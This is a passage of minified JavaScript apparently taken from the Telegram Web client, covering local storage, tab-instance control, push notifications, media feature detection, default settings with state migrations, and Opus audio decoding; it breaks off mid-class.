Number.prototype.toUserId = function () {
  return +this
}
Number.prototype.toChatId = function () {
  return Math.abs(this)
}
Number.prototype.toPeerId = function (t) {
  return t === void 0 ? +this : t ? -Math.abs(this) : +this
}
Number.prototype.isPeerId = function () {
  return !0
}
;[
  ["isUser", jr],
  ["isAnyChat", zr],
].forEach((t) => {
  const e = Array.isArray(t) ? t[0] : t,
    s = Array.isArray(t) ? t[1] : t
  ;(String.prototype[e] = function () {
    return s.call(null, this.toString())
  }),
    (Number.prototype[e] = function () {
      return s.call(null, +this)
    })
})
function Gr(...t) {
  const e = t.reduce((i, n) => i + (n.byteLength || n.length), 0),
    s = new Uint8Array(e)
  let r = 0
  return (
    t.forEach((i) => {
      s.set(i instanceof ArrayBuffer ? new Uint8Array(i) : i, r),
        (r += i.byteLength || i.length)
    }),
    s
  )
}
Uint8Array.prototype.concat = function (...t) {
  return Gr(this, ...t)
}
Uint8Array.prototype.toJSON = function () {
  return [...this]
}
Promise.prototype.finally =
  Promise.prototype.finally ||
  function (t) {
    const e = (s) => Promise.resolve(t()).then(s)
    return this.then(
      (s) => e(() => s),
      (s) => e(() => Promise.reject(s))
    )
  }
class Yr {
  constructor() {
    this.convertPromises = {}
  }
  init() {
    ;(this.worker = new Worker(
      new URL(
        "" + new URL("webp.worker-895c8b50.js", import.meta.url).href,
        self.location
      )
    )),
      this.worker.addEventListener("message", (e) => {
        const r = e.data.payload,
          i = this.convertPromises[r.fileName]
        i &&
          (r.bytes ? i.resolve(r.bytes) : i.reject(),
          delete this.convertPromises[r.fileName])
      })
  }
  postMessage(e) {
    this.init && (this.init(), (this.init = null)), this.worker.postMessage(e)
  }
  convert(e, s) {
    if (this.convertPromises.hasOwnProperty(e)) return this.convertPromises[e]
    const r = q()
    return (
      this.postMessage({
        type: "convertWebp",
        payload: { fileName: e, bytes: s },
      }),
      (this.convertPromises[e] = r)
    )
  }
}
const ks = new Yr()
S.webpWorkerController = ks
class Hr {
  constructor() {
    ;(this.prefix = ""),
      (this.cache = {}),
      (this.useStorage = !0),
      Y.test && (this.prefix = "t_")
  }
  get(e, s = !0) {
    if (this.cache.hasOwnProperty(e) && s) return this.cache[e]
    if (this.useStorage) {
      let r
      try {
        r = localStorage.getItem(this.prefix + e)
      } catch {
        this.useStorage = !1
      }
      if (r !== null)
        try {
          r = JSON.parse(r)
        } catch {}
      else r = void 0
      return r
    }
  }
  set(e, s = !1) {
    for (const r in e)
      if (e.hasOwnProperty(r)) {
        const i = e[r]
        if (((this.cache[r] = i), this.useStorage && !s))
          try {
            const n = JSON.stringify(i)
            localStorage.setItem(this.prefix + r, n)
          } catch {
            this.useStorage = !1
          }
      }
  }
  delete(e, s = !1) {
    ;(e = "" + e), s || delete this.cache[e]
    try {
      localStorage.removeItem(this.prefix + e)
    } catch {}
  }
  clear() {
    const e = [
      "dc",
      "server_time_offset",
      "xt_instance",
      "user_auth",
      "state_id",
      "k_build",
    ]
    for (let s = 1; s <= 5; ++s)
      e.push(`dc${s}_server_salt`), e.push(`dc${s}_auth_key`)
    for (const s of e) this.delete(s, !0)
  }
  toggleStorage(e, s) {
    if (((this.useStorage = e), !!s))
      if (!e) this.clear()
      else return this.set(this.cache)
  }
}
const Cs = class {
  constructor() {
    Cs.STORAGES.push(this), re || (this.storage = new Hr())
  }
  async proxy(t, ...e) {
    return re
      ? _e.getInstance().invoke("localStorageProxy", { type: t, args: e })
      : ((e = Array.prototype.slice.call(e)),
        this.storage[t].apply(this.storage, e))
  }
  get(t, e) {
    return this.proxy("get", t, e)
  }
  set(t, e) {
    return this.proxy("set", t, e)
  }
  delete(t, e) {
    return this.proxy("delete", t, e)
  }
  clear() {
    return this.proxy("clear")
  }
  toggleStorage(t, e) {
    return this.proxy("toggleStorage", t, e)
  }
}
let bs = Cs
bs.STORAGES = []
const R = new bs()
S.appStorage = R
class $r {
  reload() {
    try {
      location.reload()
    } catch {}
  }
  close() {
    try {
      window.close()
    } catch {}
  }
  focus() {
    window.focus()
  }
}
const Ps = new $r()
function N(t) {
  if (t === null || typeof t != "object") return t
  if (t instanceof Date) return new Date(t.getTime())
  if (Array.isArray(t)) return t.map((i) => N(i))
  if (ArrayBuffer.isView(t)) return t.slice()
  const e = new t.constructor()
  for (var s in t) t.hasOwnProperty(s) && (e[s] = N(t[s]))
  return e
}
const Ne = typeof SharedWorker < "u" && !Y.noSharedWorker,
  qr = ee ? "touchstart" : "mousemove"
class Kr extends ne {
  constructor() {
    super(),
      (this._isIdle = !0),
      (this.focusPromise = Promise.resolve()),
      (this.focusResolve = () => {}),
      window.addEventListener("blur", () => {
        ;(this.isIdle = !0),
          window.addEventListener(
            "focus",
            () => {
              this.isIdle = !1
            },
            { once: !0 }
          )
      }),
      window.addEventListener(
        qr,
        () => {
          this.isIdle = !1
        },
        { once: !0, passive: !0 }
      ),
      this.addEventListener("change", (e) => {
        e
          ? (this.focusPromise = new Promise((s) => {
              this.focusResolve = s
            }))
          : this.focusResolve()
      })
  }
  getFocusPromise() {
    return this.focusPromise
  }
  get isIdle() {
    return this._isIdle
  }
  set isIdle(e) {
    this._isIdle !== e && ((this._isIdle = e), this.dispatchEvent("change", e))
  }
}
const We = new Kr(),
  Xr = 5e3,
  Jr = 3e4,
  Zr = 2e4,
  Qr = Ne
class ei extends ne {
  constructor() {
    super(!1),
      (this.log = K("INSTANCE")),
      (this.clearInstance = () => {
        this.masterInstance &&
          !this.deactivated &&
          (this.log.warn("clear master instance"), R.delete("xt_instance"))
      }),
      (this.checkInstance = async (e = We.isIdle) => {
        if (this.deactivated) return
        const s = Date.now(),
          r = { id: this.instanceId, idle: e, time: s },
          [i, n = B.build] = await Promise.all([
            R.get("xt_instance", !1),
            R.get("k_build", !1),
          ])
        if (n > B.build) {
          ;(this.masterInstance = !1),
            F.managers.networkerFactory.stopAll(),
            this.deactivateInstance("version"),
            $e.toggleStorages(!1, !1)
          return
        } else if (Qr) {
          R.set({ xt_instance: r })
          return
        }
        !e || !i || i.id === this.instanceId || i.time < s - Zr
          ? (R.set({ xt_instance: r }),
            this.masterInstance ||
              ((this.masterInstance = !0),
              F.managers.networkerFactory.startAll(),
              this.log.warn("now master instance", r)),
            this.clearDeactivateTimeout())
          : this.masterInstance &&
            ((this.masterInstance = !1),
            F.managers.networkerFactory.stopAll(),
            this.log.warn("now idle instance", r),
            this.deactivateTimeout ||
              (this.deactivateTimeout = window.setTimeout(
                () => this.deactivateInstance("tabs"),
                Jr
              )))
      }),
      (this.log = K("INSTANCE")),
      (this.instanceId = fs)
  }
  get deactivatedReason() {
    return this.deactivated
  }
  start() {
    if ((this.reset(), !this.started)) {
      ;(this.started = !0),
        We.addEventListener("change", this.checkInstance),
        setInterval(this.checkInstance, Xr),
        this.checkInstance()
      try {
        document.documentElement.addEventListener(
          "beforeunload",
          this.clearInstance
        )
      } catch {}
    }
  }
  reset() {
    ;(this.masterInstance = !1),
      this.clearDeactivateTimeout(),
      (this.deactivated = void 0)
  }
  activateInstance() {
    this.deactivated &&
      (this.reset(), this.checkInstance(!1), this.dispatchEvent("activated"))
  }
  deactivateInstance(e) {
    this.masterInstance ||
      this.deactivated ||
      (this.log.warn("deactivate", e),
      this.clearDeactivateTimeout(),
      (this.deactivated = e),
      this.dispatchEvent("deactivated", e))
  }
  clearDeactivateTimeout() {
    this.deactivateTimeout &&
      (clearTimeout(this.deactivateTimeout), (this.deactivateTimeout = 0))
  }
}
const Ue = new ei()
S && (S.singleInstance = Ue)
function ti(t, e) {
  if (t !== void 0) return (t = +t.toFixed(0)), e ? (t < dt ? t : t % dt) : t
}
function si(t) {
  return ti(t, !0)
}
const ri = 1e4
class Ts extends ne {
  constructor() {
    super(!1),
      (this.isAvailable = !0),
      (this.isPushEnabled = !1),
      (this.localNotificationsAvailable = !0),
      (this.started = !1),
      (this.settings = {}),
      (this.isFirefox =
        navigator.userAgent.toLowerCase().indexOf("firefox") > -1),
      (this.userVisibleOnly = !this.isFirefox),
      (this.log = K("PUSH-API")),
      (this.subscribe = () => {
        this.isAvailable &&
          navigator.serviceWorker.ready.then((e) => {
            e.pushManager
              .subscribe({ userVisibleOnly: this.userVisibleOnly })
              .then((s) => {
                ;(this.isPushEnabled = !0),
                  this.pushSubscriptionNotify("subscribe", s)
              })
              .catch((s) => {
                Notification.permission === "denied"
                  ? this.log("Permission for Notifications was denied")
                  : (this.log("Unable to subscribe to push.", s),
                    this.userVisibleOnly ||
                      ((this.userVisibleOnly = !0),
                      setTimeout(this.subscribe, 0)))
              })
          })
      }),
      (this.isAliveNotify = () => {
        if (!this.isAvailable || Ue.deactivatedReason) return
        this.settings.baseUrl = (location.href || "").replace(/#.*$/, "")
        const e = {},
          s = {
            push_action_mute1d: he
              ? "PushNotification.Action.Mute1d.Mobile"
              : "PushNotification.Action.Mute1d",
            push_action_settings: he
              ? "PushNotification.Action.Settings.Mobile"
              : "PushNotification.Action.Settings",
            push_message_nopreview: "PushNotification.Message.NoPreview",
          }
        for (const r in s) e[r] = G.format(s[r], !0)
        this.serviceMessagePort.invokeVoid("pushPing", {
          localNotifications: this.localNotificationsAvailable,
          lang: e,
          settings: this.settings,
        }),
          (this.isAliveTO = setTimeout(this.isAliveNotify, ri))
      }),
      (!("PushManager" in window) ||
        !("Notification" in window) ||
        !("serviceWorker" in navigator)) &&
        (this.log.warn("Push messaging is not supported."),
        (this.isAvailable = !1),
        (this.localNotificationsAvailable = !1)),
      this.isAvailable &&
        Notification.permission === "denied" &&
        this.log.warn("The user has blocked notifications.")
  }
  start() {
    this.started ||
      ((this.started = !0),
      this.getSubscription(),
      this.setUpServiceWorkerChannel())
  }
  setLocalNotificationsDisabled() {
    this.localNotificationsAvailable = !1
  }
  getSubscription() {
    this.isAvailable &&
      navigator.serviceWorker.ready.then((e) => {
        e.pushManager
          .getSubscription()
          .then((s) => {
            ;(this.isPushEnabled = !!s), this.pushSubscriptionNotify("init", s)
          })
          .catch((s) => {
            this.log.error("Error during getSubscription()", s)
          })
      })
  }
  unsubscribe() {
    this.isAvailable &&
      navigator.serviceWorker.ready.then((e) => {
        e.pushManager
          .getSubscription()
          .then((s) => {
            ;(this.isPushEnabled = !1),
              s &&
                (this.pushSubscriptionNotify("unsubscribe", s),
                setTimeout(() => {
                  s.unsubscribe()
                    .then((r) => {
                      this.isPushEnabled = !1
                    })
                    .catch((r) => {
                      this.log.error("Unsubscription error: ", r)
                    })
                }, 3e3))
          })
          .catch((s) => {
            this.log.error(
              "Error thrown while unsubscribing from push messaging.",
              s
            )
          })
      })
  }
  forceUnsubscribe() {
    this.isAvailable &&
      navigator.serviceWorker.ready.then((e) => {
        e.pushManager
          .getSubscription()
          .then((s) => {
            this.log.warn("force unsubscribe", s),
              s &&
                s
                  .unsubscribe()
                  .then((r) => {
                    this.log.warn("force unsubscribe successful", r),
                      (this.isPushEnabled = !1)
                  })
                  .catch((r) => {
                    this.log.error("Unsubscription error: ", r)
                  })
          })
          .catch((s) => {
            this.log.error(
              "Error thrown while unsubscribing from push messaging.",
              s
            )
          })
      })
  }
  setSettings(e) {
    ;(this.settings = N(e)), clearTimeout(this.isAliveTO), this.isAliveNotify()
  }
  hidePushNotifications() {
    this.isAvailable &&
      this.serviceMessagePort.invokeVoid("notificationsClear", void 0)
  }
  setUpServiceWorkerChannel() {
    this.isAvailable &&
      (this.serviceMessagePort.addEventListener("pushClick", (e) => {
        if (Ue.deactivatedReason) {
          Ps.reload()
          return
        }
        this.dispatchEvent("push_notification_click", e)
      }),
      navigator.serviceWorker.ready.then(this.isAliveNotify))
  }
  pushSubscriptionNotify(e, s) {
    if (s) {
      const r = s.toJSON()
      if (!r || !r.endpoint || !r.keys || !r.keys.p256dh || !r.keys.auth) {
        this.log.warn("Invalid push subscription", r),
          this.unsubscribe(),
          (this.isAvailable = !1),
          this.pushSubscriptionNotify(e)
        return
      }
      this.log.warn("Push", e, r),
        this.dispatchEvent("push_" + e, {
          tokenType: 10,
          tokenValue: JSON.stringify(r),
        })
    } else this.log.warn("Push", e, !1), this.dispatchEvent("push_" + e, !1)
  }
  ignorePushByMid(e, s) {
    this.isAvailable &&
      this.serviceMessagePort.invokeVoid("shownNotification", e + "_" + si(s))
  }
}
const Ve = new Ts()
S && (S.webPushApiManager = Ve)
const ii = Object.freeze(
  Object.defineProperty(
    { __proto__: null, WebPushApiManager: Ts, default: Ve },
    Symbol.toStringTag,
    { value: "Module" }
  )
)
function ni(t) {
  const e = document.createElement("script"),
    s = new Promise((r) => {
      e.onload = e.onerror = () => {
        r(e)
      }
    })
  return (e.src = t), document.body.appendChild(e), s
}
function oi(t) {
  const e = Date.now()
  return t ? (e / 1e3) | 0 : e
}
class As {
  constructor() {
    this.disabled = Y.test || !B.domains.includes(location.hostname)
  }
  setAuthorized(e) {
    if (!this.disabled)
      return R.get("tgme_sync").then((s) => {
        const r = oi(!0)
        if (e && s?.canRedirect === e && s.ts + 86400 > r) return
        R.set({ tgme_sync: { canRedirect: e, ts: r } })
        const i = `_websync_?authed=${
            e ? "1" : "0"
          }&version=${encodeURIComponent(B.version + " " + B.suffix)}`,
          o = ["//telegram.me/" + i, "//t.me/" + i].map((c) =>
            ni(c).then((a) => {
              a.remove()
            })
          )
        return Promise.all(o)
      })
  }
}
const kt = new As()
S && (S.telegramMeWebManager = kt)
const ai = Object.freeze(
    Object.defineProperty(
      { __proto__: null, TelegramMeWebManager: As, default: kt },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Ct = typeof RTCPeerConnection < "u" && !le,
  ci = Ct
let Le
if (!$) Le = !0
else
  try {
    Le = +navigator.userAgent.match(/Version\/(.+?) /)[1] >= 14
  } catch {
    Le = !1
  }
const ui = Le,
  li = "filter" in (document.createElement("canvas").getContext("2d") || {}),
  hi = !!navigator?.geolocation?.getCurrentPosition && !1,
  di = Ct,
  Ls = document
    .createElement("canvas")
    .toDataURL("image/webp")
    .startsWith("data:image/webp"),
  bt = new Set(["image/jpeg", "image/png", "image/bmp"])
Ls && bt.add("image/webp")
const Pt = document.createElement("video"),
  fi = !!Pt.canPlayType("video/webm") && !$ && !ue,
  Ms = !!Pt.canPlayType("video/quicktime") || $ || ue,
  gi = !!Pt.canPlayType('video/mp4; codecs="hev1"'),
  Di = Object.freeze(
    Object.defineProperty(
      {
        __proto__: null,
        IS_H265_SUPPORTED: gi,
        IS_MOV_SUPPORTED: Ms,
        IS_WEBM_SUPPORTED: fi,
      },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Tt = new Set(["image/gif", "video/mp4", "video/webm"])
Ms && Tt.add("video/quicktime")
const mi = [...bt].concat([...Tt]),
  pi = new Set(mi),
  Fi = !le && !1,
  Ei = "getDisplayMedia" in (navigator?.mediaDevices || {}),
  vi = !!navigator?.vibrate,
  Gt = document.createElement("audio"),
  Is = !!(Gt.canPlayType && Gt.canPlayType("audio/ogg;").replace(/no/, ""))
let Rs = !1
try {
  const t = document.createElement("canvas").getContext("webgl"),
    e = t.getExtension("WEBGL_debug_renderer_info"),
    s = (e && t.getParameter(e.UNMASKED_RENDERER_WEBGL)) || ""
  ;((s.match(/Apple/) && !s.match(/Apple GPU/)) ||
    t.getSupportedExtensions().indexOf("WEBGL_compressed_texture_s3tc_srgb") ===
      -1) &&
    (Rs = !0)
} catch {}
const yi = Rs,
  Yt = {
    CAN_USE_TRANSFERABLES: ui,
    IS_APPLE_MX: yi,
    IS_CALL_SUPPORTED: ci,
    IS_CANVAS_FILTER_SUPPORTED: li,
    IS_EMOJI_SUPPORTED: ht,
    IS_GEOLOCATION_SUPPORTED: hi,
    IS_GROUP_CALL_SUPPORTED: di,
    IS_PARALLAX_SUPPORTED: Fi,
    IS_SCREEN_SHARING_SUPPORTED: Ei,
    IS_TOUCH_SUPPORTED: ee,
    ...Di,
    IS_VIBRATE_SUPPORTED: vi,
    IS_OPUS_SUPPORTED: Is,
    IS_SHARED_WORKER_SUPPORTED: Ne,
    IS_WEBP_SUPPORTED: Ls,
    IS_WEBRTC_SUPPORTED: Ct,
    IMAGE_MIME_TYPES_SUPPORTED: bt,
    MEDIA_MIME_TYPES_SUPPORTED: pi,
    VIDEO_MIME_TYPES_SUPPORTED: Tt,
    ...ur,
  }
function Si() {
  const t = document.createElement("input")
  ;(t.type = "time"),
    (t.value = "15:00"),
    (t.style.visibility = "hidden"),
    document.body.append(t)
  const e = t.offsetWidth
  return t.remove(), e > 110 ? "h12" : "h23"
}
const _i = {
  8: new Uint8Array(1),
  16: new Uint16Array(1),
  32: new Uint32Array(1),
}
function pt(t) {
  const e = _i[t]
  return crypto.getRandomValues(e), e[0]
}
function Zn() {
  return "" + pt(32) + (pt(32) % 16777215)
}
const wi = B.version,
  ki = B.build,
  Ht = {
    _: "theme",
    access_hash: "",
    id: "",
    settings: [
      {
        _: "themeSettings",
        pFlags: {},
        base_theme: { _: "baseThemeClassic" },
        accent_color: 3379436,
        message_colors: [6072403],
        wallpaper: {
          _: "wallPaper",
          pFlags: { default: !0, pattern: !0 },
          access_hash: "",
          document: void 0,
          id: "",
          slug: "pattern",
          settings: {
            _: "wallPaperSettings",
            pFlags: {},
            intensity: 50,
            background_color: 14409147,
            second_background_color: 7054727,
            third_background_color: 14014605,
            fourth_background_color: 8960132,
          },
        },
      },
      {
        _: "themeSettings",
        pFlags: {},
        base_theme: { _: "baseThemeNight" },
        accent_color: 8877281,
        message_colors: [8877281],
        wallpaper: {
          _: "wallPaper",
          pFlags: { default: !0, pattern: !0, dark: !0 },
          access_hash: "",
          document: void 0,
          id: "",
          slug: "pattern",
          settings: {
            _: "wallPaperSettings",
            pFlags: {},
            intensity: -50,
            background_color: 16696470,
            second_background_color: 14511289,
            third_background_color: 9842623,
            fourth_background_color: 5200853,
          },
        },
      },
    ],
    slug: "",
    title: "",
    emoticon: "🏠",
    pFlags: { default: !0 },
  },
  $t = (t, e, s) => ({
    ...Ht,
    name: t,
    settings: {
      ...Ht.settings.find((r) => r.base_theme._ === e),
      highlightingColor: s,
    },
  }),
  V = {
    allDialogsLoaded: {},
    pinnedOrders: {},
    contactsListCachedTime: 0,
    updates: {},
    filtersArr: [],
    maxSeenMsgId: 0,
    stateCreatedTime: Date.now(),
    recentEmoji: [],
    recentCustomEmoji: [],
    topPeersCache: {},
    recentSearch: [],
    version: wi,
    build: ki,
    authState: { _: he ? "authStateSignIn" : "authStateSignQr" },
    hiddenPinnedMessages: {},
    settings: {
      messagesTextSize: 16,
      distanceUnit: "kilometers",
      sendShortcut: "enter",
      autoDownload: {
        photo: { contacts: !0, private: !0, groups: !0, channels: !0 },
        video: { contacts: !0, private: !0, groups: !0, channels: !0 },
        file: { contacts: !0, private: !0, groups: !0, channels: !0 },
      },
      autoDownloadNew: {
        _: "autoDownloadSettings",
        file_size_max: 3145728,
        pFlags: { video_preload_large: !0, audio_preload_next: !0 },
        photo_size_max: 1048576,
        video_size_max: 15728640,
        video_upload_maxbitrate: 100,
        small_queue_active_operations_max: 0,
        large_queue_active_operations_max: 0,
      },
      stickers: { suggest: "all", dynamicPackOrder: !0, loop: !0 },
      emoji: { suggest: !0, big: !0 },
      themes: [
        $t("day", "baseThemeClassic", "hsla(86.4, 43.846153%, 45.117647%, .4)"),
        $t(
          "night",
          "baseThemeNight",
          "hsla(299.142857, 44.166666%, 37.470588%, .4)"
        ),
      ],
      theme: "system",
      notifications: { sound: !1 },
      timeFormat: Si(),
      liteMode: {
        all: !1,
        animations: !1,
        chat: !1,
        chat_background: !1,
        chat_spoilers: !1,
        effects: !1,
        effects_premiumstickers: !1,
        effects_reactions: !1,
        effects_emoji: !1,
        emoji: !1,
        emoji_messages: !1,
        emoji_panel: !1,
        gif: !1,
        stickers: !1,
        stickers_chat: !1,
        stickers_panel: !1,
        video: !1,
      },
    },
    playbackParams: {
      volume: 1,
      muted: !1,
      playbackRate: 1,
      playbackRates: { voice: 1, video: 1, audio: 1 },
      loop: !1,
      round: !1,
    },
    keepSigned: !0,
    chatContextMenuHintWasShown: !1,
    hideChatJoinRequests: {},
    stateId: pt(32),
    notifySettings: {},
    confirmedWebViews: [],
    seenTooltips: { storySound: !1 },
  }
function Ce(t, e) {
  ;(t = t.split(" ", 1)[0]), (e = e.split(" ", 1)[0])
  const s = t.split("."),
    r = e.split(".")
  for (let i = 0; i < s.length; ++i) {
    const n = +s[i],
      o = +r[i]
    if (n > o) return 1
    if (n < o) return -1
  }
  return 0
}
function Ci(t) {
  return typeof t == "object" && t !== null
}
function Os(t, e, s, r, i, n) {
  for (const o in t) {
    const c = n ? `${n}.${o}` : o
    i?.has(c) ||
      (typeof e[o] != typeof t[o]
        ? ((e[o] = N(t[o])), s?.(r || o))
        : Ci(t[o]) && Os(t[o], e[o], s, r || o, i, c))
  }
}
function bi(t, e, s) {
  const r = performance.now()
  return (
    (s || console).warn(xe(), "start", e),
    t.then(() => {
      ;(s || console).warn(xe(), "end", e, performance.now() - r)
    }),
    t
  )
}
function Pi(t) {
  return (...e) => bi(...e, t)
}
const Ti = 24 * 60 * 60 * 1e3,
  be = V.version,
  De = V.build,
  Pe = Object.keys(V),
  Ai = [
    "contactsListCachedTime",
    "stateCreatedTime",
    "maxSeenMsgId",
    "filtersArr",
  ]
async function Li() {
  const t = K("STATE-LOADER", _t.Error),
    e = performance.now(),
    s = Pi(t),
    r = Pe.map((y) => s(ce.get(y), "state " + y))
      .concat(
        s(R.get("user_auth"), "auth"),
        s(R.get("state_id"), "auth"),
        s(R.get("k_build"), "auth"),
        s(R.get("auth_key_fingerprint"), "auth"),
        s(R.get(`dc${B.baseDcId}_auth_key`), "auth")
      )
      .concat(s(ce.get("user_auth"), "old auth")),
    i = await Promise.all(r)
  t.warn("promises", performance.now() - e)
  const n = [],
    o = (y, M) => {
      ;(a[y] = M), n.push(y)
    },
    c = (y) => {
      ;(n.length = 0), (a = y), n.push(...Object.keys(a))
    }
  let a = {}
  for (let y = 0, M = Pe.length; y < M; ++y) {
    const I = Pe[y],
      _ = i[y]
    _ !== void 0 ? (a[I] = _) : o(I, N(V[I]))
  }
  i.splice(0, Pe.length)
  let u = i.shift()
  const h = i.shift(),
    m = i.shift(),
    v = i.shift(),
    D = i.shift(),
    w = i.shift()
  if (!u && w) {
    u = w
    const y = ["dc", "server_time_offset", "xt_instance"]
    for (let _ = 1; _ <= 5; ++_)
      y.push(`dc${_}_server_salt`), y.push(`dc${_}_auth_key`)
    const M = await Promise.all(y.map((_) => ce.get(_)))
    y.push("user_auth"),
      M.push(
        typeof u == "number" || typeof u == "string"
          ? {
              dcID: M[0] || B.baseDcId,
              date: (Date.now() / 1e3) | 0,
              id: u.toPeerId(!1),
            }
          : u
      )
    const I = {}
    y.forEach((_, l) => {
      I[_] = M[l]
    }),
      await R.set(I)
  }
  u &&
    ((a.authState = { _: "authStateSignedIn" }),
    F.dispatchEvent(
      "user_auth",
      typeof u == "number" || typeof u == "string"
        ? { dcID: 0, date: (Date.now() / 1e3) | 0, id: u.toPeerId(!1) }
        : u
    ))
  const b = new Set(),
    g = (y) => {
      y.push("authState", "stateId")
      const M = new Map(y.map((_) => [_, a[_]]))
      ;(a = N(V)),
        M.forEach((_, l) => {
          a[l] = _
        })
      const I = ["chats", "dialogs", "users"]
      for (const _ of I) b.add(_)
      c(a)
    }
  if (
    (a.stateId !== h &&
      (h !== void 0 && g([]), await R.set({ state_id: a.stateId })),
    D)
  ) {
    const y = D.slice(0, 8)
    v ? v !== y && g([]) : g(["settings"]),
      v !== y && (await R.set({ auth_key_fingerprint: y }))
  }
  const E = Date.now()
  a.stateCreatedTime + Ti < E &&
    (se && t("will refresh state", a.stateCreatedTime, E),
    ((M) => {
      M.forEach((I) => {
        o(I, N(V[I]))
      })
    })(Ai))
  const k = a.settings.autoDownload
  if (k?.private !== void 0) {
    const y = ["contacts", "private", "groups", "channels"]
    ;["photo", "video", "file"].forEach((I) => {
      const _ = (k[I] = {})
      y.forEach((l) => {
        _[l] = k[l]
      })
    }),
      y.forEach((I) => {
        delete k[I]
      }),
      o("settings", a.settings)
  }
  Os(
    V,
    a,
    (y) => {
      o(y, a[y])
    },
    void 0,
    new Set(["settings.themes"])
  )
  let T, L
  if (a.version !== be || a.build !== De) {
    if (
      (a.build < 322 &&
        (o("allDialogsLoaded", N(V.allDialogsLoaded)),
        o("pinnedOrders", N(V.pinnedOrders)),
        o("filtersArr", N(V.filtersArr)),
        b.add("dialogs")),
      Ce(a.version, "1.7.1") === -1)
    ) {
      let y = !1
      if (Ce(a.version, "1.3.0") === -1)
        (y = !0),
          (a.settings.theme = N(V.settings.theme)),
          (a.settings.themes = N(V.settings.themes))
      else if (Ce(a.version, "1.7.1") === -1) {
        y = !0
        const M = a.settings.themes
        a.settings.themes = N(V.settings.themes)
        try {
          M.forEach((I) => {
            const _ = I.background
            if (!_) return
            const l = a.settings.themes.find((d) => d.name === I.name)
            l.settings.highlightingColor = _.highlightingColor
            const f = (d) => d && parseInt(d.slice(1), 16),
              p = (_.color || "").split(",").map(f)
            if (_.color && !_.slug)
              l.settings.wallpaper = {
                _: "wallPaperNoFile",
                id: 0,
                pFlags: {},
                settings: { _: "wallPaperSettings", pFlags: {} },
              }
            else {
              const d = {
                  _: "wallPaper",
                  id: 0,
                  access_hash: 0,
                  slug: _.slug,
                  document: {},
                  pFlags: {},
                  settings: { _: "wallPaperSettings", pFlags: {} },
                },
                A = d.settings
              ;(l.settings.wallpaper = d),
                _.slug && !_.color
                  ? (A.pFlags.blur = _.blur || void 0)
                  : _.intensity &&
                    ((A.intensity = _.intensity),
                    (d.pFlags.pattern = !0),
                    (d.pFlags.dark = _.intensity < 0 || void 0))
            }
            if (p.length) {
              const d = l.settings.wallpaper.settings
              ;(d.background_color = p[0]),
                (d.second_background_color = p[1]),
                (d.third_background_color = p[2]),
                (d.fourth_background_color = p[3])
            }
          })
        } catch (I) {
          console.error("migrating themes error", I)
        }
      }
      y && o("settings", a.settings)
    }
    if (
      (a.build < 309 &&
        ((a.settings.liteMode.animations = !a.settings.animationsEnabled),
        (a.settings.liteMode.video = !a.settings.autoPlay.videos),
        (a.settings.liteMode.gif = !a.settings.autoPlay.gifs)),
      a.build < 312 &&
        typeof a.settings.stickers.suggest == "boolean" &&
        (a.settings.stickers.suggest = a.settings.stickers.suggest
          ? "all"
          : "none"),
      a.build <= 432)
    ) {
      let y = !1
      try {
        for (const M of a.settings.themes)
          M.settings.highlightingColor ||
            ((M.settings.highlightingColor = M.settings.highlightningColor),
            delete M.settings.highlightningColor,
            (y = !0))
      } catch {}
      y && o("settings", a.settings)
    }
    Ce(a.version, be) !== 0 && ((T = be), (L = a.version)),
      o("version", be),
      o("build", De)
  }
  return (
    m !== De && (!m || m < De) && R.set({ k_build: De }),
    (F.settings = a.settings),
    se && t("state res", a, N(a)),
    t.warn("total", performance.now() - e),
    { state: a, resetStorages: b, newVersion: T, oldVersion: L, pushedKeys: n }
  )
}
let Mi
function Ii() {
  return Mi ?? (Mi = Li())
}
class Ri {
  constructor() {
    ;(this.sampleRate = 48e3),
      (this.tasks = []),
      (this.keepAlive = !1),
      (this.log = K("OPUS", _t.Error))
  }
  isPlaySupported() {
    return Is
  }
  loadWavWorker() {
    this.wavWorker ||
      ((this.wavWorker = new Worker("waveWorker.min.js")),
      this.wavWorker.addEventListener("message", (e) => {
        const s = e.data
        if ((this.log("[WAV] got message:", s), s && s.page)) {
          const r = s.page
          this.onTaskEnd(this.tasks.shift(), r)
        }
      }))
  }
  loadWorker() {
    this.worker ||
      ((this.worker = new Worker("decoderWorker.min.js")),
      this.worker.addEventListener("message", (e) => {
        const s = e.data
        this.log("[DECODER] got message", s),
          s.type === "done"
            ? (this.wavWorker.postMessage({ command: "done" }),
              s.waveform && (this.tasks[0].waveform = s.waveform))
            : this.wavWorker.postMessage(
                { command: "encode", buffers: e.data },
                $ ? void 0 : s.map((r) => r.buffer)
              )
      }))
  }
  setKeepAlive(e) {
    ;(this.keepAlive = e),
      this.keepAlive
        ? (this.loadWorker(), this.loadWavWorker())
        : this.tasks.length || this.terminateWorkers()
  }
  onTaskEnd(e, s) {
    s
      ? (clearTimeout(e.timeout),
        e.callback.resolve({ bytes: s, waveform: e.waveform }))
      : e.callback.reject("timeout"),
      this.tasks.length && this.executeNewTask(this.tasks[0]),
      this.terminateWorkers()
  }
  terminateWorkers(e = !1) {
    ;((this.keepAlive || this.tasks.length) && !e) ||
      (this.worker && (this.worker.terminate(), (this.worker = null)),
      this.wavWorker && (this.wavWorker.terminate(), (this.wavWorker = null)))
  }
  executeNewTask(e) {
    this.worker.postMessage({
      command: "init",
      decoderSampleRate: this.sampleRate,
      outputBufferSampleRate: this.sampleRate,
    }),
      this.wavWorker.postMessage({
        command: "init",
        wavBitDepth: 16,
        wavSampleRate: this.sampleRate,
      }),
      this.log("[DECODER] send decode"),
      this.worker.postMessage(
        { command: "decode", pages: e.pages, waveform: e.withWaveform },
        $ ? void 0 : [e.pages.buffer]
      ),
      (e.timeout = window.setTimeout(() => {
        this.log.error("decode timeout"),
          this.terminateWorkers(!0),
          this.tasks.length && (this.loadWorker(), this.loadWavWorker()),
          this.onTaskEnd(this.tasks.shift())
      }, 1e4))
  }
  pushDecodeTask(e, s) {
    return new Promise((r, i) => {
      const n = {
        pages: e,
        withWaveform: s,
        callback: { resolve: r, reject: i },
        timeout: 0,
      }
      this.loadWorker(),
        this.loadWavWorker(),
        this.tasks.push(n) === 1 && this.executeNewTask(n)
    })
  }
  async decode(e, s = !1) {
    return this.pushDecodeTask(e, s).then(async (r) => {
      const i = new Blob([r.bytes], { type: "audio/wav" })
      return {
        url: await $e.invoke("createObjectURL", i),
        waveform: r.waveform,
      }
    })
  }
}
const Bs = new Ri()
S.opusDecodeController = Bs
class Oi extends wt {
  constructor() {
